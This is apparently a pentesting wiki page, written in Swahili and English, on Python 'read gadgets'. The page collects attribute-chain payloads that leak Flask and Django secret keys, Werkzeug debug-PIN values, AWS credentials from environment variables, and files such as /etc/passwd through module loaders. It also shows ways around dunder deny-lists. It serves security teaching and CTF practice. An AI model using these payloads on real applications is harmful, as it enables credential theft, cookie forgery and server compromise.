# Python Internal Read Gadgets

## Maelezo ya Msingi

Vulnerabilities tofauti kama vile [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) au [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) zinaweza kukuruhusu **kusoma data ya ndani ya Python lakini hazitakuruhusu kutekeleza code**. Kwa hivyo, pentester atahitaji kutumia kikamilifu ruhusa hizi za kusoma ili **kupata privileges nyeti na kuongeza ukubwa wa vulnerability**.

### Flask - Soma secret key

Ukurasa mkuu wa application ya Flask huenda ukawa na object ya kimataifa ya **`app`**, ambapo **secret hii imewekwa**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Katika hali hii, inawezekana kufikia object hii kwa kutumia gadget yoyote ya **access global objects** kutoka kwenye [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

Katika hali ambapo **vulnerability iko kwenye python file tofauti**, unahitaji gadget ya kutembea kwenye files ili kufikia file kuu na **access global object `app.secret_key`**, kisha uweze [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload kama huu [kutoka kwenye writeup hii](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Tumia **payload hii kusoma `app.secret_key`**. Ikiwa bug ya awali pia inakupa write primitive (kwa mfano, class pollution), path hiyo hiyo inaweza kutumiwa kuibadilisha na kusaini Flask cookies zenye privileges zaidi.

### Werkzeug - machine_id and node uuid

[**Kwa kutumia payload hizi kutoka kwenye writeup hii**](https://vozec.fr/writeups/tweedle-dum-dee/) utaweza kufikia **machine_id** na **uuid** ya node, ambazo ni **bits binafsi** unazohitaji ili [**kutengeneza Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) na kufikia Python console katika `/console` ikiwa **debug mode imewezeshwa**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Kumbuka kwamba unaweza kupata **server local path ya `app.py`** kwa kuzalisha **error** kwenye ukurasa wa wavuti ambayo **itakupa path hiyo**.

Ikiwa vulnerability iko kwenye python file tofauti, angalia Flask trick ya awali ili kufikia objects kutoka kwenye main python file.

### Django - SECRET_KEY na settings module

Django settings object huhifadhiwa kwenye `sys.modules` mara tu application inapoanza. Kwa kutumia read primitives pekee, unaweza ku-leak **`SECRET_KEY`**, fallback keys, database credentials au signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Ikiwa gadget yenye udhaifu iko kwenye module nyingine, pitia globals kwanza:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` zina thamani sawa na `SECRET_KEY` ya sasa: bado zinathibitisha values za zamani zilizosainiwa wakati wa rotation.<sup>[[1]](#references)</sup> Pia leak `SESSION_ENGINE` na `SESSION_SERIALIZER` ili kubaini haraka ikiwa impact ni cookie forgery pekee au ni kitu chenye nguvu zaidi. Kwa maelezo ya web impact, angalia [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - soma source code na files

Python modules zilizopakiwa kwa kawaida huhifadhi `__loader__`. File-backed loaders mara nyingi hutoa `get_source()` na `get_data()`, ambazo ni **read-only primitives** bora unapoweza kufikia module object lakini si `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Hii ni muhimu sana kwa kudump **config modules, blueprints, helper files au hidden routes** na kurejesha API keys, DSNs, flag paths au gadget entry points za ziada.

Ikiwa una subclass enumeration pekee, tafuta loader kwa kutumia jina badala ya kuweka index kwa hard-code:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Global za generator / coroutine frame

Ikiwa unaweza kuunda au kufikia generator/coroutine object, frame yake inaweza kuvuja globals **bila kuhitaji gadget yoyote ya function `__globals__`**. Hii ni muhimu dhidi ya filters zinazozuia majina ya dunder pekee na kusahau frame attributes kama `gi_frame`, `ag_frame`, `cr_frame` au `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Baada ya kupata frame globals, endelea sawasawa na ilivyo kwenye gadgets nyingine (`sys.modules`, settings objects, `os.environ`, n.k.). Recent sandbox escapes zinaendelea kugundua tena mbinu hii kwa sababu `gi_frame` na `f_globals` si dunder attributes na mara nyingi hubaki baada ya deny-lists zisizo makini.

### Environment variables / cloud creds kupitia modules zilizopakiwa

Jails nyingi bado hu-import `os` au `sys` mahali fulani. Unaweza kutumia function yoyote inayoweza kufikiwa `__init__.__globals__` ili kuelekea kwenye module ya `os` ambayo tayari ime-importiwa na kutoa **environment variables** zilizo na API tokens, cloud keys au flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Ikiwa subclass index imechujwa, tumia loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables mara nyingi ndizo secrets pekee zinazohitajika ili kuhamia kutoka kusoma hadi compromise kamili (cloud IAM keys, database URLs, signing keys, n.k.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), matoleo yaliyoathiriwa `<0.61.0`) iliruhusu **class pollution** kupitia component requests zilizoundwa mahsusi. Property path kama `__init__.__globals__` ingeweza kufikia globals za component-module na modules zilizo-importiwa; advisory inaonyesha kubadilisha Django's `SECRET_KEY` na values katika `os.environ`, badala ya exploit ya kusoma pekee.<sup>[[5]](#references)</sup> Ikiwa bug tofauti inatoa read access kwa object graph hiyo hiyo, globals hizo zinaweza kufichua configuration na credentials bila kuhitaji code execution.

### Gadget collections for chaining

CTFs za hivi karibuni na utafiti wa pyjail unaonyesha read chains zinazotegemeka, zilizojengwa kwa kutumia attribute access na subclass enumeration pekee. Lists zinazo-maintainiwa na community kama [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) zinaorodhesha mamia ya gadgets ndogo unazoweza kuchanganya ili kupita kutoka objects hadi `__globals__`, `sys.modules` na hatimaye data nyeti.<sup>[[2]](#references)</sup> Pendelea **attribute/name based searches** badala ya raw subclass indexes kwa sababu position ya `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, n.k. hubadilika kati ya Python versions na pamoja na libraries za ziada zilizo-importiwa.

## References

- [1] [Docs za Django za cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki ya Python sandbox gadgets](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, inayopelekea RCE, XSS, DoS na Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
